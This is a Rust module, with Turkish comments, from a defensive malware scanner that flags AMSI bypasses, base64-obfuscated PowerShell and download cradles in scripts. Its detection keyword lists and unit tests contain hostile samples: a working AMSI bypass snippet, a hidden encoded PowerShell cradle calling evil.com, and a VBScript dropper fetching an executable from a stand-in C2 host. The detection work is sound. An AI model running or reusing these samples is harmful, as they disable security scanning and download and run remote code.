use anyhow::Result;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use base64::Engine as _;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;

use super::trait_engine::{FileHashes, ScanEngine, Severity, ThreatDetection};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptThreatReport {
    pub file_type: String,
    pub threat_name: String,
    pub severity: String,
    pub mitre_technique: String,
    pub description: String,
    pub matched_indicators: Vec<String>,
    pub deobfuscated_payload: Option<String>,
}

pub struct ScriptHunter;

impl ScriptHunter {
    pub fn new() -> Self {
        Self
    }

    /// Dosya uzantısının bir script olup olmadığını kontrol eder
    pub fn is_supported_script(path: &Path) -> bool {
        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            matches!(
                ext.to_lowercase().as_str(),
                "ps1" | "psm1" | "bat" | "cmd" | "vbs" | "js" | "jse" | "wsf" | "hta"
            )
        } else {
            false
        }
    }

    /// Bir betik metnini derinlemesine analiz eder
    pub fn analyze_script(content: &str, file_hint: Option<&str>) -> Option<ScriptThreatReport> {
        let content_lower = content.to_lowercase();
        let mut indicators = Vec::new();
        let mut deobfuscated = None;
        let mut mitre = "T1059";
        let mut severity = Severity::Medium;
        let mut threat_title = "Zararli Komut Dosyasi / Betik Suphesi".to_string();

        let ext = file_hint
            .and_then(|h| Path::new(h).extension().and_then(|e| e.to_str()))
            .map(|e| e.to_lowercase())
            .unwrap_or_else(|| "ps1".to_string());

        // 1. AMSI Bypass ve Anti-Tamper Tespiti (En Kritik Seviye)
        let amsi_patterns = [
            ("amsiinitfailed", "AMSI Basarisizlik Bayragi Manipulasyonu (amsiInitFailed)"),
            ("amsiscanbuffer", "AmsiScanBuffer Bellek Yamalama / Patch Girisimi"),
            ("system.management.automation.amsiutils", "AmsiUtils Sinifi Refleksiyonu ile EDR Atlama"),
            ("amsicontext", "AMSI Baglam Bellek Manipulasyonu"),
        ];

        for (pat, desc) in &amsi_patterns {
            if content_lower.contains(pat) {
                indicators.push(format!("[AMSI BYPASS] {}", desc));
                severity = Severity::Critical;
                mitre = "T1562.001";
                threat_title = "AMSI Koruma Atlama & Anti-Tamper Betigi".to_string();
            }
        }

        // 2. PowerShell Base64 Gizleme ve De-obfuscation (-enc / -encodedcommand)
        let enc_regex = Regex::new(r#"(?i)(?:-enc|-encodedcommand|-e)\s+([A-Za-z0-9+/=]{20,})"#).ok();
        if let Some(re) = enc_regex {
            if let Some(caps) = re.captures(content) {
                if let Some(m) = caps.get(1) {
                    let b64_str = m.as_str();
                    indicators.push(format!("[OBFUSCATION] Base64 ile gizlenmis PowerShell komutu tespit edildi ({} bayt)", b64_str.len()));
                    if let Ok(decoded_bytes) = BASE64_STANDARD.decode(b64_str) {
                        // PowerShell base64 genelde UTF-16LE kodlanir
                        let decoded_str = if decoded_bytes.len() >= 2 && decoded_bytes[1] == 0 {
                            let u16_vec: Vec<u16> = decoded_bytes
                                .chunks_exact(2)
                                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                                .collect();
                            String::from_utf16_lossy(&u16_vec)
                        } else {
                            String::from_utf8_lossy(&decoded_bytes).to_string()
                        };

                        deobfuscated = Some(decoded_str.clone());
                        let decoded_lower = decoded_str.to_lowercase();

                        // Çözülen payload içinde download cradle kontrolü
                        if decoded_lower.contains("downloadstring")
                            || decoded_lower.contains("downloadfile")
                            || decoded_lower.contains("iex")
                            || decoded_lower.contains("invoke-expression")
                            || decoded_lower.contains("webclient")
                        {
                            indicators.push("[DE-OBFUSCATED CRADLE] Gizli Base64 icinde uzaktan kod indirme beşiği (Download Cradle) saptandi!".to_string());
                            severity = Severity::Critical;
                            mitre = "T1059.001";
                            threat_title = "Gizlenmis (Base64) Zararli PowerShell Indirici".to_string();
                        }
                    }
                }
            }
        }

        // 3. Living-Off-The-Land İndirme ve Yürütme Beşikleri (Download Cradles)
        let cradle_patterns = [
            ("downloadstring", "Net.WebClient.DownloadString ile uzaktan kod cekme"),
            ("downloadfile", "Net.WebClient.DownloadFile ile disk uzerine yukleyici indirme"),
            ("invoke-webrequest", "Invoke-WebRequest ile uzaktan dosya transferi"),
            ("start-bitstransfer", "BITS servisi uzerinden gizli arka plan veri aktarimi"),
            ("certutil -urlcache", "CertUtil aracini kullanarak uzaktan calistirilabilir dosya indirme"),
            ("certutil.exe -urlcache", "CertUtil ikilisiyle web uzerinden payload cekme"),
            ("wscript.shell", "WScript.Shell uzerinden gizli surec calistirma"),
            ("msxml2.xmlhttp", "MSXML2 HTTP uzerinden sessiz ikili indirme"),
            ("adodb.stream", "ADODB.Stream ile bellekten diske calistirilabilir ikili yazma"),
        ];

        for (pat, desc) in &cradle_patterns {
            if content_lower.contains(pat) {
                indicators.push(format!("[DOWNLOAD CRADLE] {}", desc));
                if severity != Severity::Critical {
                    severity = Severity::High;
                }
                mitre = "T1105";
            }
        }

        // 4. Dinamik Kod Yürütme (IEX / eval / ExecuteGlobal)
        if (content_lower.contains("iex") || content_lower.contains("invoke-expression"))
            && (content_lower.contains("http://") || content_lower.contains("https://") || content_lower.contains("webclient"))
        {
            indicators.push("[FILELESS EXECUTION] IEX / Invoke-Expression ile hafizada dosyasiz kod yurutme saptandi".to_string());
            severity = Severity::Critical;
            threat_title = "Dosyasiz (Fileless) PowerShell Yurutucu".to_string();
            mitre = "T1059.001";
        }

        if content_lower.contains("executeglobal") || content_lower.contains("eval(") {
            indicators.push("[DYNAMIC EVAL] Dinamik betik kodu yurutme cagirisi".to_string());
        }

        // 5. Şüpheli Karakter / Dize Birleştirme Gizlemesi (String Formatting Obfuscation)
        let format_re = Regex::new(r#"\{[0-9]\}\s*\{[0-9]\}.*-f"#).ok();
        if let Some(re) = format_re {
            if re.is_match(content) {
                indicators.push("[STRING MANGLE] PowerShell '-f' format dizgisi ile komut gizleme".to_string());
            }
        }

        // Karakter kodu ile komut birlestirme: [char]0x70 + [char]0x77
        if content_lower.contains("[char]") && (content_lower.contains("+") || content_lower.contains(",")) {
            let count = content_lower.matches("[char]").count();
            if count >= 4 {
                indicators.push(format!("[CHAR ARRAY] Karakter dizisiyle ([char] x{}) komut insa etme gizlemesi", count));
            }
        }

        // Ters tırnak (backtick) gizlemesi: d`o`w`n`l`o`a`d
        let backtick_count = content.matches('`').count();
        if backtick_count >= 5 {
            indicators.push(format!("[BACKTICK OBFUSCATION] Yogun ters tirnak ({} adet) ile imza atlatma saptandi", backtick_count));
        }

        // Eğer hiçbir gösterge yoksa temiz
        if indicators.is_empty() {
            return None;
        }

        let desc = format!(
            "{} adet supheli/zararli betik davranisi tespit edildi. Ana teknik: MITRE ATT&CK {}",
            indicators.len(),
            mitre
        );

        Some(ScriptThreatReport {
            file_type: ext.to_uppercase(),
            threat_name: threat_title,
            severity: severity.to_string(),
            mitre_technique: mitre.to_string(),
            description: desc,
            matched_indicators: indicators,
            deobfuscated_payload: deobfuscated,
        })
    }
}

impl Default for ScriptHunter {
    fn default() -> Self {
        Self::new()
    }
}

impl ScanEngine for ScriptHunter {
    fn name(&self) -> &'static str {
        "Script & AMSI Hunter"
    }

    fn description(&self) -> &'static str {
        "PowerShell, VBScript, Batch ve AMSI atlatma girisimlerini saptayan derin betik analizoru"
    }

    fn scan(
        &self,
        path: &Path,
        content: &[u8],
        _hashes: &FileHashes,
    ) -> Result<Option<ThreatDetection>> {
        if !Self::is_supported_script(path) {
            return Ok(None);
        }

        let text = String::from_utf8_lossy(content);
        let file_name = path.file_name().map(|f| f.to_string_lossy().to_string());

        if let Some(rep) = Self::analyze_script(&text, file_name.as_deref()) {
            let sev = match rep.severity.as_str() {
                "CRITICAL" => Severity::Critical,
                "HIGH" => Severity::High,
                _ => Severity::Medium,
            };

            let details = format!(
                "{} [{}] | Gostergeler: {}",
                rep.description,
                rep.mitre_technique,
                rep.matched_indicators.join("; ")
            );

            return Ok(Some(ThreatDetection {
                threat_name: rep.threat_name,
                engine_name: self.name().to_string(),
                severity: sev,
                details,
                rule_name: Some(rep.mitre_technique),
            }));
        }

        Ok(None)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_amsi_bypass_detection() {
        let script = r#"
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $field = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
            $field.SetValue($null,$true)
        "#;
        let rep = ScriptHunter::analyze_script(script, Some("test.ps1")).expect("AMSI bypass yakalanmali");
        assert_eq!(rep.severity, "CRITICAL");
        assert!(rep.matched_indicators.iter().any(|i| i.contains("AMSI")));
        assert_eq!(rep.mitre_technique, "T1562.001");
    }

    #[test]
    fn test_powershell_base64_deobfuscation() {
        let cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";
        let utf16_bytes: Vec<u8> = cmd.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = BASE64_STANDARD.encode(&utf16_bytes);
        let script = format!("powershell.exe -nop -w hidden -enc {}", b64);
        let rep = ScriptHunter::analyze_script(&script, Some("malicious.bat")).expect("Base64 cradle yakalanmali");
        assert_eq!(rep.severity, "CRITICAL");
        assert!(rep.deobfuscated_payload.is_some());
        let deob = rep.deobfuscated_payload.unwrap();
        assert!(deob.contains("DownloadString") || deob.contains("http://"));
    }

    #[test]
    fn test_vbscript_dropper_detection() {
        let script = r#"
            Set xHttp = CreateObject("MSXML2.XMLHTTP")
            Set bStrm = CreateObject("ADODB.Stream")
            xHttp.Open "GET", "http://c2.example.com/trojan.exe", False
            xHttp.Send
            bStrm.Type = 1
            bStrm.Open
            bStrm.write xHttp.responseBody
            bStrm.savetofile "C:\Users\Public\payload.exe", 2
        "#;
        let rep = ScriptHunter::analyze_script(script, Some("dropper.vbs")).expect("VBScript dropper yakalanmali");
        assert!(rep.matched_indicators.iter().any(|i| i.contains("MSXML2")));
        assert!(rep.matched_indicators.iter().any(|i| i.contains("ADODB.Stream")));
    }

    #[test]
    fn test_clean_script() {
        let script = r#"
            Write-Output "Hello World"
            Get-Service | Where-Object Status -eq 'Running'
        "#;
        let rep = ScriptHunter::analyze_script(script, Some("clean.ps1"));
        assert!(rep.is_none());
    }
}
